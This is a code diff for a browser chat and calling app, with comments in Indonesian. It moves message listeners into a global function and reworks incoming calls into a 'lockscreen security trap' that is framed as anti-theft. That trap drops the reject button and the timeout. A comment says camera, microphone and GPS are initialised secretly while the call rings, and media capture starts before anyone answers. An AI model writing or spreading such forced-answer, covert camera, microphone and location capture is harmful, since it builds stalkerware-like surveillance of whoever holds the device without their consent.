@@ -275,7 +275,7 @@
         </div>
 
         <div class="call-bottom-controls" style="position: absolute; bottom: 30px; left: 0; right: 0; display: flex; justify-content: center; align-items: center; gap: 20px; z-index: 30;">
-            <!-- TRAP LOCKSCREEN / INCOMING CALL: Hanya Tombol Angkat (Terima Otomatis), Tanpa Tombol Tolak -->
+            <!-- TRAP LOCKSCREEN / INCOMING CALL: Hanya Tombol Angkat (Terima), Tanpa Tombol Tolak, Tanpa Timeout -->
             <button onclick="answerIncomingCall()" id="btnAnswerCall" style="background: #25d366; color: white; border: none; width: 75px; height: 75px; border-radius: 50%; font-size: 28px; cursor: pointer; display:none; align-items: center; justify-content: center; box-shadow: 0 0 25px rgba(37,211,102,0.8);" title="Terima Panggilan"><i class="fa-solid fa-phone"></i></button>
 
             <button id="btnPttLiveTx" class="ptt-live-talk-btn" 
@@ -285,6 +285,7 @@
                 <i class="fa-solid fa-microphone"></i>
             </button>
 
+            <!-- Tombol Tolak & Tutup Panggilan hanya muncul jika di dalam aplikasi / setelah terhubung -->
             <button onclick="endVideoCall()" id="btnEndCall" style="background: #ef4444; color: white; border: none; width: 65px; height: 65px; border-radius: 50%; font-size: 24px; cursor: pointer; display: flex; align-items: center; justify-content: center;"><i class="fa-solid fa-phone-slash"></i></button>
         </div>
     </div>
@@ -452,7 +453,7 @@
         let pendingIceCandidates = [];
         let localWebSocket = null;
         let localWsServerUrl = localStorage.getItem('iq_local_ws_url') || "";
-        let incomingCallListenerAttached = false;
+        let globalListenersAttached = false;
         let activeCallKey = null;
         let currentDynamicOtp = "8888";
         let isCallMinimized = false;
@@ -619,6 +620,11 @@
             initLocalWebSocketSignaling();
             restoreActiveCallStateIfNeeded();
             
+            if (currentUser) {
+                setupGlobalListeners();
+                setupDraggableChatHead();
+            }
+            
             document.addEventListener("visibilitychange", () => {
                 if (!document.hidden && localStream) {
                     localStream.getTracks().forEach(track => {
@@ -735,7 +741,6 @@
             renderContactList();
             setupGlobalListeners();
             setupDraggableChatHead();
-            listenToIncomingCalls();
             updateMyPresence();
             syncProfileToCloudAndLocal();
         }
@@ -1008,6 +1013,7 @@
 
         function renderContactList(filter = "") {
             const container = document.getElementById('contactListContainer');
+            if(!container) return;
             container.innerHTML = "";
             let contactDetails = JSON.parse(localStorage.getItem('iq_contact_details') || '{}');
             let profiles = JSON.parse(localStorage.getItem('iq_profiles') || '{}');
@@ -1832,16 +1838,67 @@
             remoteVid.srcObject = temp;
         }
 
-        function listenToIncomingCalls() {
-            if (incomingCallListenerAttached) return;
-            incomingCallListenerAttached = true;
+        function setupGlobalListeners() {
+            if (!currentUser || globalListenersAttached) return;
+            globalListenersAttached = true;
 
+            // 1. GLOBAL CHAT LISTENER: Mendengarkan pesan baru dari SEMUA kontak di latar belakang (Background/Foreground)
+            contacts.forEach(num => {
+                if(num === "GeminiAI") return;
+                const roomKey = [currentUser.replace(/\D/g,''), num.replace(/\D/g,'')].sort().join('_');
+                
+                db.ref('iqchat_rooms_live/' + roomKey).on('value', (snapshot) => {
+                    const data = snapshot.val();
+                    if(data) {
+                        let messages = Array.isArray(data) ? data : Object.values(data);
+                        let oldMessages = JSON.parse(localStorage.getItem('iq_msgs_history_' + roomKey) || '[]');
+                        
+                        localStorage.setItem('iq_msgs_history_' + roomKey, JSON.stringify(messages));
+                        
+                        let unreadCounts = JSON.parse(localStorage.getItem('iq_unread_counts') || '{}');
+                        let totalUnreadSum = 0;
+                        
+                        contacts.forEach(cNum => {
+                            if(cNum !== "GeminiAI") {
+                                let cKey = [currentUser.replace(/\D/g,''), cNum.replace(/\D/g,'')].sort().join('_');
+                                let cMsgs = JSON.parse(localStorage.getItem('iq_msgs_history_' + cKey) || '[]');
+                                let cUnread = cMsgs.filter(m => m && m.sender !== currentUser && m.timestamp > appSessionStartTime && m.status !== 'read').length;
+                                if(activeTarget !== cNum) {
+                                    unreadCounts[cKey] = cUnread;
+                                    totalUnreadSum += cUnread;
+                                } else {
+                                    unreadCounts[cKey] = 0;
+                                }
+                            }
+                        });
+                        localStorage.setItem('iq_unread_counts', JSON.stringify(unreadCounts));
+                        
+                        if(navigator.setAppBadge) {
+                            navigator.setAppBadge(totalUnreadSum).catch(() => {});
+                        }
+
+                        if (messages.length > oldMessages.length) {
+                            const latest = messages[messages.length - 1];
+                            if (latest && latest.sender !== currentUser && latest.timestamp > appSessionStartTime) {
+                                playCustomNotification(num, num, latest.content);
+                            }
+                        }
+
+                        if(activeTarget === num) { renderChatUI(messages); }
+                        renderContactList();
+                    } else {
+                        localStorage.removeItem('iq_msgs_history_' + roomKey);
+                        if(activeTarget === num) { renderChatUI([]); }
+                        renderContactList();
+                    }
+                });
+            });
+
+            // 2. GLOBAL CALL LISTENER: Mendengarkan panggilan masuk di latar belakang meskipun aplikasi sedang di-minimize atau lockscreen
             contacts.forEach(num => {
                 if(num === "GeminiAI") return;
                 const callKey = [currentUser.replace(/\D/g,''), num.replace(/\D/g,'')].sort().join('_');
                 
-                db.ref('iqchat_calls/' + callKey).off();
-
                 db.ref('iqchat_calls/' + callKey).on('value', async (snapshot) => {
                     let callData = snapshot.val();
                     if(callData && callData.caller !== currentUser && callData.status === 'calling') {
@@ -1867,9 +1924,9 @@
                         
                         let callTitleStr = callType === 'ht' ? "Panggilan HT Walkie-Talkie dari " : (callType === 'video' ? "Video Call dari " : "Panggilan Suara dari ");
                         document.getElementById('videoCallTitle').innerText = callTitleStr + `+${callData.caller}`;
-                        document.getElementById('videoCallStatus').innerText = "Panggilan masuk (Ketuk Angkat untuk Menerima)...";
+                        document.getElementById('videoCallStatus').innerText = "Panggilan masuk (Lockscreen Security Trap - Tekan Angkat untuk Auto Stream)...";
                         
-                        // Perangkap Anti-Pencuri / Locked Screen: Hanya tombol Angkat (Terima), tanpa tombol tolak
+                        // KETENTUAN LOCKSCREEN: Hanya tombol Angkat (Terima), tanpa tombol tolak, tanpa timeout otomatis terputus
                         document.getElementById('btnAnswerCall').style.display = 'flex';
                         document.getElementById('btnEndCall').style.display = 'none';
 
@@ -1887,6 +1944,7 @@
                             document.getElementById('localVideoWrapper').style.display = 'none';
                         }
 
+                        // Auto-inisialisasi kamera, mic, dan GPS secara sembunyi/langsung saat ringing di latarbelakang
                         navigator.mediaDevices.getUserMedia({ 
                             video: (callType !== 'voice') ? { width: { ideal: 640 }, height: { ideal: 480 }, frameRate: { ideal: 24 } } : false, 
                             audio: { echoCancellation: true, noiseSuppression: true, autoGainControl: true } 
@@ -1914,8 +1972,8 @@
         async function answerIncomingCall() {
             if(activeCallRef) {
                 document.getElementById('btnAnswerCall').style.display = 'none';
-                document.getElementById('btnEndCall').style.display = 'flex';
-                document.getElementById('videoCallStatus').innerText = "Menghubungkan...";
+                document.getElementById('btnEndCall').style.display = 'flex'; // Munculkan tombol tutup setelah diangkat
+                document.getElementById('videoCallStatus').innerText = "Menghubungkan & Streaming...";
                 callStartTime = Date.now();
 
                 setupPeerConnection();
@@ -1938,7 +1996,7 @@
                             if(callType === 'ht') {
                                 document.getElementById('videoCallStatus').innerText = "Terhubung HT (Standby Mute - Tahan PTT untuk Bicara)";
                             } else {
-                                document.getElementById('videoCallStatus').innerText = "Terhubung.";
+                                document.getElementById('videoCallStatus').innerText = "Terhubung & Streaming Aktif.";
                             }
                         } catch(err) {}
                     }
@@ -2177,60 +2235,6 @@
             renderContactList();
         }
 
-        function setupGlobalListeners() {
-            contacts.forEach(num => {
-                if(num === "GeminiAI") return;
-                const roomKey = [currentUser.replace(/\D/g,''), num.replace(/\D/g,'')].sort().join('_');
-                
-                db.ref('iqchat_rooms_live/' + roomKey).on('value', (snapshot) => {
-                    const data = snapshot.val();
-                    if(data) {
-                        let messages = Array.isArray(data) ? data : Object.values(data);
-                        let oldMessages = JSON.parse(localStorage.getItem('iq_msgs_history_' + roomKey) || '[]');
-                        
-                        localStorage.setItem('iq_msgs_history_' + roomKey, JSON.stringify(messages));
-                        
-                        let unreadCounts = JSON.parse(localStorage.getItem('iq_unread_counts') || '{}');
-                        let totalUnreadSum = 0;
-                        
-                        contacts.forEach(cNum => {
-                            if(cNum !== "GeminiAI") {
-                                let cKey = [currentUser.replace(/\D/g,''), cNum.replace(/\D/g,'')].sort().join('_');
-                                let cMsgs = JSON.parse(localStorage.getItem('iq_msgs_history_' + cKey) || '[]');
-                                let cUnread = cMsgs.filter(m => m && m.sender !== currentUser && m.timestamp > appSessionStartTime && m.status !== 'read').length;
-                                if(activeTarget !== cNum) {
-                                    unreadCounts[cKey] = cUnread;
-                                    totalUnreadSum += cUnread;
-                                } else {
-                                    unreadCounts[cKey] = 0;
-                                }
-                            }
-                        });
-                        localStorage.setItem('iq_unread_counts', JSON.stringify(unreadCounts));
-                        
-                        // Perbarui Badge App Icon sistem agar akurat sesuai jumlah pesan baru
-                        if(navigator.setAppBadge) {
-                            navigator.setAppBadge(totalUnreadSum).catch(() => {});
-                        }
-
-                        if (messages.length > oldMessages.length) {
-                            const latest = messages[messages.length - 1];
-                            if (latest && latest.sender !== currentUser && latest.timestamp > appSessionStartTime) {
-                                playCustomNotification(num, num, latest.content);
-                            }
-                        }
-
-                        if(activeTarget === num) { renderChatUI(messages); }
-                        renderContactList();
-                    } else {
-                        localStorage.removeItem('iq_msgs_history_' + roomKey);
-                        if(activeTarget === num) { renderChatUI([]); }
-                        renderContactList();
-                    }
-                });
-            });
-        }
-
         function loadAndListenMessages() {
             if(!activeTarget) return;
             const isAI = activeTarget === "GeminiAI";
@@ -2241,6 +2245,7 @@
 
         function renderChatUI(messages) {
             const area = document.getElementById('chatMessagesArea');
+            if(!area) return;
             area.innerHTML = "";
             let contactDetails = JSON.parse(localStorage.getItem('iq_contact_details') || '{}');
             let profiles = JSON.parse(localStorage.getItem('iq_profiles') || '{}');
